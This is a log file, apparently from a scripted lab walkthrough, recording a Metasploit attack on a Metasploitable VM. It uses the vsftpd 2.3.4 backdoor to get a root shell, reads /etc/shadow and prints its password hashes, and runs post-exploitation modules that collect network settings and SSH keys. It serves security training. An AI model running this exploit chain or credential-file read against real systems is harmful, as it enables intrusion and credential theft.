@@ -1,0 +1,128 @@
+--- 2026-04-02 12:03:41 INFO: ---
+
+Command: Note: the vsftpd exploit can take up to 30 seconds. Please be patient.
+Debug: 'Note: the vsftpd exploit can take up to 30 seconds. Please be patient.'
+--- 2026-04-02 12:04:13 INFO: ---
+
+Command: exploit/unix/ftp/vsftpd_234_backdoor
+
+--- 2026-04-02 12:04:14 INFO: ---
+
+Command: id
+uid=0(root) gid=0(root)
+
+--- 2026-04-02 12:04:14 INFO: ---
+
+Command: Shell session user: uid=0(root) gid=0(root)
+
+Debug: 'Shell session user: uid=0(root) gid=0(root)
+'
+--- 2026-04-02 12:04:15 INFO: ---
+
+Command: uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+
+--- 2026-04-02 12:04:15 INFO: ---
+
+Command: Target kernel: Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+
+Debug: 'Target kernel: Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+'
+--- 2026-04-02 12:04:16 INFO: ---
+
+Command: hostname
+metasploitable
+
+--- 2026-04-02 12:04:18 INFO: ---
+
+Command: cat /etc/shadow
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
+sync:*:14684:0:99999:7:::
+games:*:14684:0:99999:7:::
+man:*:14684:0:99999:7:::
+lp:*:14684:0:99999:7:::
+mail:*:14684:0:99999:7:::
+news:*:14684:0:99999:7:::
+uucp:*:14684:0:99999:7:::
+proxy:*:14684:0:99999:7:::
+www-data:*:14684:0:99999:7:::
+backup:*:14684:0:99999:7:::
+list:*:14684:0:99999:7:::
+irc:*:14684:0:99999:7:::
+gnats:*:14684:0:99999:7:::
+nobody:*:14684:0:99999:7:::
+libuuid:!:14684:0:99999:7:::
+dhcp:*:14684:0:99999:7:::
+syslog:*:14684:0:99999:7:::
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
+sshd:*:14684:0:99999:7:::
+msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
+bind:*:14685:0:99999:7:::
+postfix:*:14685:0:99999:7:::
+ftp:*:14685:0:99999:7:::
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
+mysql:!:14685:0:99999:7:::
+tomcat55:*:14691:0:99999:7:::
+distccd:*:14698:0:99999:7:::
+user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
+service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
+telnetd:*:14715:0:99999:7:::
+proftpd:!:14727:0:99999:7:::
+statd:*:15474:0:99999:7:::
+
+--- 2026-04-02 12:04:18 INFO: ---
+
+Command: Shadow file contents captured. We have root.
+Debug: 'Shadow file contents captured. We have root.'
+--- 2026-04-02 12:04:18 INFO: ---
+
+Command: Running post module. Metasploit session ID: 6
+Debug: 'Running post module. Metasploit session ID: 6'
+--- 2026-04-02 12:04:22 INFO: ---
+
+Command: post/linux/gather/enum_network
+VERBOSE => false
+SESSION => 6
+[!] Unknown datastore option: DisablePayloadHandler.
+DisablePayloadHandler => True
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: unix. This module works with: Linux.
+[*] Running module against metasploitable (192.168.56.101)
+[*] Module running as root
+[+] Info:
+[+] 	_                  _       _ _        _     _      ____   _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ | '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) || | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ |_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|                            |_|                                          Warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started
+[+] 	Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+[*] Collecting data...
+[+] Network config stored in /home/boenket/.msf4/loot/20260402120421_default_192.168.56.101_linux.enum.netwo_818654.txt
+[+] Route table stored in /home/boenket/.msf4/loot/20260402120421_default_192.168.56.101_linux.enum.netwo_202519.txt
+[+] Firewall config stored in /home/boenket/.msf4/loot/20260402120421_default_192.168.56.101_linux.enum.netwo_296574.txt
+[+] DNS config stored in /home/boenket/.msf4/loot/20260402120421_default_192.168.56.101_linux.enum.netwo_384273.txt
+[+] SSHD config stored in /home/boenket/.msf4/loot/20260402120421_default_192.168.56.101_linux.enum.netwo_508949.txt
+[+] Host file stored in /home/boenket/.msf4/loot/20260402120421_default_192.168.56.101_linux.enum.netwo_026500.txt
+[+] SSH keys stored in /home/boenket/.msf4/loot/20260402120421_default_192.168.56.101_linux.enum.netwo_831930.txt
+[+] Active connections stored in /home/boenket/.msf4/loot/20260402120421_default_192.168.56.101_linux.enum.netwo_920653.txt
+[-] Unable to get data for Wireless information
+[+] Listening ports stored in /home/boenket/.msf4/loot/20260402120421_default_192.168.56.101_linux.enum.netwo_332054.txt
+[+] If-Up/If-Down stored in /home/boenket/.msf4/loot/20260402120421_default_192.168.56.101_linux.enum.netwo_252231.txt
+[*] Post module execution completed
+
+--- 2026-04-02 12:04:23 INFO: ---
+
+Command: post/linux/gather/checkvm
+VERBOSE => false
+SESSION => 6
+[!] Unknown datastore option: DisablePayloadHandler.
+DisablePayloadHandler => True
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: unix. This module works with: Linux.
+[*] Gathering System info ....
+[+] This appears to be a 'VirtualBox' virtual machine
+[*] Post module execution completed
+
+--- 2026-04-02 12:04:23 INFO: ---
+
+Command: Walkthrough complete. Check output.log for results
+Debug: 'Walkthrough complete. Check output.log for results'
